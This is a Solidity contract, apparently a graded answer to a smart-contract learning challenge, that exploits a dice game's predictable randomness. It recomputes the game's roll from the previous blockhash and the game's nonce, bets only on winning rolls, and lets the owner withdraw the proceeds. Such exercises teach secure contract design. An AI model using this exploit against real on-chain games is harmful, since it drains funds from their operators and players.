pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

//import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    /////////////////
    /// Errors //////
    /////////////////

    error NotEnoughETH(uint256 required, uint256 available);
    error NotWinningRoll(uint256 roll);
    error InsufficientBalance(uint256 requested, uint256 available);
    error WithdrawFailed(address to, uint256 amount);

    //////////////////////
    /// State Variables //
    //////////////////////

    DiceGame public diceGame;

    ///////////////////
    /// Constructor ///
    ///////////////////

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    ///////////////////
    /// Functions /////
    ///////////////////

    receive() external payable {}

    function riggedRoll() external {
        uint256 riggedRollBalance = address(this).balance;
        if (riggedRollBalance < 0.002 ether) {
            revert NotEnoughETH(0.002 ether, riggedRollBalance);
        }
        uint256 roll = calculateNextRoll();
        if (roll > 5) {
            revert NotWinningRoll(roll);
        }
        diceGame.rollTheDice{ value: riggedRollBalance }();
    }

    function calculateNextRoll() private view returns (uint256) {
        uint256 nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;
        return roll;
    }

    function withdraw(address _address, uint256 _amount) external onlyOwner {
        uint256 riggedRollBalance = address(this).balance;
        if (riggedRollBalance < _amount) {
            revert InsufficientBalance(_amount, riggedRollBalance);
        }
        (bool success, ) = _address.call{ value: _amount }("");
        if (!success) {
            revert WithdrawFailed(_address, _amount);
        }
    }
}
